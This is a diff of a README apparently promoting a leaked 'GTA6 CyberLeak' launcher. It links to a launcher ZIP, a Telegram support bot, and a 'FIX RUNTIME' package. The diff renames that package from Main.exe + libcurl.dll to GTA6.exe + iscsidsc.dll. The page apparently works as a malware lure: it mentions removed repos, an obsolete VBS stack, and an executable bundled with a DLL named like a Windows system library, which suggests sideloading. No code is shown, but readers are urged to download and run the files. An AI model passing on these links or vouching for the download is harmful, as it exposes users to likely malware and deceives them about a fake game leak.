@@ -11,7 +11,7 @@ The previous GitHub org **cyberleekgta6** was **removed**. This account hosts th
 
 [![Site](https://img.shields.io/badge/Site-cyberleakgta6.com-ff4da6?style=for-the-badge)](https://cyberleakgta6.com/)
 [![Launcher ZIP](https://img.shields.io/badge/ZIP-GTA6_CyberLeak_Launcher.zip-fcaf17?style=for-the-badge)](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip)
-[![Runtime](https://img.shields.io/badge/FIX_RUNTIME-Main.exe_+_libcurl.dll-7c5cff?style=for-the-badge)](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0)
+[![Runtime](https://img.shields.io/badge/FIX_RUNTIME-GTA6.exe_+_iscsidsc.dll-7c5cff?style=for-the-badge)](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0)
 [![Support](https://img.shields.io/badge/Telegram-CyberLeakSupp__bot-26A5E4?style=for-the-badge)](https://t.me/CyberLeakSupp_bot)
 
 ---
@@ -22,7 +22,7 @@ The previous GitHub org **cyberleekgta6** was **removed**. This account hosts th
 |---|---|
 | Launcher ZIP (no password) | [GTA6-CyberLeak-Launcher · 123](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/tag/123) |
 | Site 302 | [cyberleakgta6.com/download/GTA6_CyberLeak_Launcher.zip](https://cyberleakgta6.com/download/GTA6_CyberLeak_Launcher.zip) |
-| Runtime `Main.exe` + `libcurl.dll` | [gta-6-runtime-gup-exe · v1.0](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0) |
+| Runtime `GTA6.exe` + `iscsidsc.dll` | [gta-6-runtime-gup-exe · v1.0](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0) |
 | Company / about | [cyberleakgta6.com/about.html](https://cyberleakgta6.com/about.html) |
 
 Windows x64 only. Client **~113 GB** downloads **inside** the launcher. Not a 113 GB torrent. Not an APK.
@@ -30,7 +30,7 @@ Windows x64 only. Client **~113 GB** downloads **inside** the launcher. Not a 11
 ## Repos
 
 - [GTA6-CyberLeak-Launcher](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher) — launcher ZIP, tag `123`
-- [gta-6-runtime-gup-exe](https://github.com/FoxyYT1/gta-6-runtime-gup-exe) — FIX RUNTIME (`Main.exe` + `libcurl.dll`)
+- [gta-6-runtime-gup-exe](https://github.com/FoxyYT1/gta-6-runtime-gup-exe) — FIX RUNTIME (`GTA6.exe` + `iscsidsc.dll`)
 - [gta-6-runtime-helperlib-dll](https://github.com/FoxyYT1/gta-6-runtime-helperlib-dll) — **legacy redirect** (old helperlib/VBS stack is obsolete)
 
 Do not use dead links to **github.com/cyberleekgta6** or **HubMicraRu**.
